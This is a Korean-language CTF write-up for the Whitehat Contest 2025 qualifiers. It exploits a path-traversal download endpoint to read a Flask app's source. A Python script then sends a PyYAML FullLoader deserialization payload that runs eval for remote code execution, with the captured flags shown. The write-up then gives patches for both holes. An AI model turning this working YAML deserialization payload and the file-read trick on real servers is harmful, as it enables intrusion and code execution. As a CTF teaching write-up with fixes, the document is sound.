---
title: Whitehat Contest Quals Write-Up
published: 2025-10-19
description: " "
tags: [CTF_Writeup, whitehatcontest]
category: CTF
draft: false
---

### 서론
예선에 웹 문제 좀만 더 내주면 좋겠다. 두 문제 풀고 할 거 없어서 하지도 못하는 포렌식 잡느라 힘들었다.  

예선에선 다 리얼월드 형태의 문제들이 출제 되었다. 한 가지 시나리오를 가지고 1에서 5번까지의 시나리오 문제를 풀어내야 했고
공격자 침투 경로 따라서 플래그 따주면 된다.
웹 요소가 포함 되어있는건 `시나리오 1-1 ~ 1-5` 문제였는데, 이것도 1-1, 1-2만 웹이고 나머지는 리버싱 암호학 등이다.

---

### Scenario 1-1
공격자가 서버의 취약점을 가지고 셸을 땄다고 한다. 우리도 똑같이 침투해서 서버내에 있는 플래그를 얻어야한다.

접속해보면 공공 데이터 공유 서비스가 있고 딱봐도 수상해보이는 download 기능이 있다.

`http://54.180.78.10/download?file=traffic.json`

LFI가 터지므로 여기서 적당히 게싱해서 아래 파일들을 읽어온다.

- /app/app.py
- /app/route/theme.py
- /app/route/file.py
- /app/Dockerfile
- /app/requirements.txt

중요한 파일 내용만 보자면

```
COPY . $APP_HOME
RUN FLAG_CONTENT=$(cat $APP_HOME/flag.txt) && \
    echo "$FLAG_CONTENT" > "/$FLAG_CONTENT" && \
    chmod 400 "/$FLAG_CONTENT" && \
    chown root:root "/$FLAG_CONTENT" && \
    rm $APP_HOME/flag.txt
```

플래그 자체가 파일명이 되어 루트 경로로 들어가 있다.

```
Flask==3.0.3
PyYAML==5.3.1
gunicorn==23.0.0
```

PyYAML 모듈이 5.3.1 구버전이라 RCE CVE가 존재한다.

```python
@theme_bp.post("/api/theme/preview")
def preview_theme():
    body = request.data.decode("utf-8", "ignore")
    if len(body) > 2**7:
        return jsonify({"error": "Body is too long"})
    try:
        parsed: Any = yaml.load(body, Loader=yaml.FullLoader)

        colors: Dict[str, str] = {}
        if isinstance(parsed, dict) and isinstance(parsed.get("colors"), dict):
            colors = {
                "primary": str(parsed["colors"].get("primary", "#336699")),
                "accent": str(parsed["colors"].get("accent", "#88aadd")),
            }
        write_theme_css(colors)
    except Exception:
        write_theme_css({"primary": "#336699", "accent": "#88aadd"})

    try:
        return jsonify({"ok": repr(parsed)})
    except Exception:
        return jsonify({"error": "Failed to parse YAML"})
```

`theme.py`에서 `load()`를 사용하고 있으므로 취약점을 트리거 할 수 있다.

```python
import yaml
import requests
import time
import base64

url = 'http://54.180.78.10/api/theme/preview'

def exploit():
  payload1 = f"""!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , ['__import__("os").listdir("/")']]]"""
  print(len(payload1))
  res = requests.post(url, data = payload1)
  print(res.json())

exploit()
```

이런식으로 루트 경로 읽어와주면 된다.

`whitehat2025{dc50ad05f7db236ea24f3c8258289ecf839412025e0b84b0619de24e77f3de93}`

---
### Scenario 1-2

이제 여기서 찾은 취약점들을 패치하면 플래그를 준다.

간단해서 딱히 설명할것도 없다.

#### LFI 패치
```py
@files_bp.get("/download")
def download_file():
    rel = request.args.get("file", "")
    full_path = os.path.join(BASE_DIR, rel)
```

```py
rel = request.args.get("file", "")
rel = rel.replace("..", "")
rel = rel.replace("/", "")
```

어차피 서버에서 요구하는건 파일명이므로 `/` `..` 다 제거시켜주면 된다.

#### RCE 패치
이건 그냥 모듈에서 `safe_load`라는걸 지원한다.

```py
parsed: Any = yaml.safe_load(body)
```

`whitehat2025{b8b18dae5b0aed7d538d030604fbaeb6e1ac1960de20e06e01daa21b9627f113}`
